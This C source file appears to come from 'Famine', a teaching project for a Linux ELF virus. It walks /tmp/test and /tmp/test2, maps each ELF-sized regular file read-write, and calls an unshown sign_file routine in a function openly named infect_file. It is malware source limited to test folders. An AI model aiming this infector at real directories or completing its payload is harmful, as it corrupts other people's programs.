#include "famine.h"
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#ifndef PATH_MAX
# define PATH_MAX 4096
#endif

static int  is_dot_entry(const char *name)
{
    if (name[0] != '.')
        return 0;
    if (name[1] == '\0')
        return 1;
    if (name[1] == '.' && name[2] == '\0')
        return 1;
    return 0;
}

static void infect_file(const char *path)
{
    int         fd;
    struct stat st;
    char        *adress;

    fd = open(path, O_RDWR);
    if (fd < 0)
        return;
    if (fstat(fd, &st) < 0)
    {
        close(fd);
        return;
    }
    if (!S_ISREG(st.st_mode) || st.st_size < (off_t)sizeof(Elf64_Ehdr))
    {
        close(fd);
        return;
    }
    adress = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (adress == MAP_FAILED)
    {
        close(fd);
        return;
    }
    if (is_signed(adress, st.st_size) == 0 && sign_file(adress, st.st_size) != 0)
        msync(adress, st.st_size, MS_SYNC);
    munmap(adress, st.st_size);
    close(fd);
}

static void scan_directory(const char *dirname)
{
    DIR             *dir;
    struct dirent   *entry;
    char            path[PATH_MAX];
    int             written;

    dir = opendir(dirname);
    if (dir == NULL)
        return;
    entry = readdir(dir);
    while (entry != NULL)
    {
        written = snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);
        if (!is_dot_entry(entry->d_name)
            && written >= 0 && written < (int)sizeof(path))
            infect_file(path);
        entry = readdir(dir);
    }
    closedir(dir);
}

void    scan_targets(void)
{
    scan_directory("/tmp/test");
    scan_directory("/tmp/test2");
}
